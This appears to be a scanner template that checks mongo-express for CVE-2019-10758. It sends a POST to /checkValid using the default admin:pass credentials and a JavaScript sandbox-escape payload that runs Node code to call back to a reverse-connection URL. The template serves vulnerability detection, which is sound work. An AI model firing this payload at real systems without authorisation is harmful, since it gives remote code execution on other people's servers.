id: mongo-express-cve-2019-10758

info:
    name: mongo-express-cve-2019-10758
    author: fnmsd(https://github.com/fnmsd)
    severity: high

manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /checkValid
            headers:
                Authorization: Basic YWRtaW46cGFzcw==
            body: document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')
            follow_redirects: true
        expression: reverse.wait(5)
expression: r0()
